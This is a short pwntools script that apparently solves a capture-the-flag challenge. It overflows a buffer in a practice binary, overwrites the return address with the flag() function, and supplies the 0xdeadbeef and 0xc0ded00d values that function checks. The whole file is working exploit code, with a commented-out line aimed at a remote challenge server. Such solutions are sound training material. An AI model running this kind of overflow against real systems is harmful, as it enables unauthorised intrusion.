from pwn import *

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./vuln")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}


#p = remote("209.97.177.45", 31809)
#p = process("./vuln")
p = gdb.debug("./vuln", '''
break *main
break *flag
break *0x80492b0
''')

flag = 0x080491e2

# flag() opens a file and checks for 0xdeadbeef & 0xc0ded00d.
# If it's found the flag is displayed.

# Buffer overflow in vuln() leads to overwriting 2 variables in flag(). Specifically,
# ebp+0x8 & ebp+0xc for flag(). These variables are compared to 0xdeadbeef & 0xc0ded00d
# respectively. If true, print flag.

deadbeef = 0xdeadbeef
dude = 0xc0ded00d

payload = ""
payload += "A" * 188        
payload += p32(flag)        # <-- EIP overwrite
payload += "C" * 4
payload += p32(deadbeef)    # <-- ebp+0x8 overflow
payload += p32(dude)        # <-- ebp+0xc overflow

p.sendline(payload)
p.interactive()



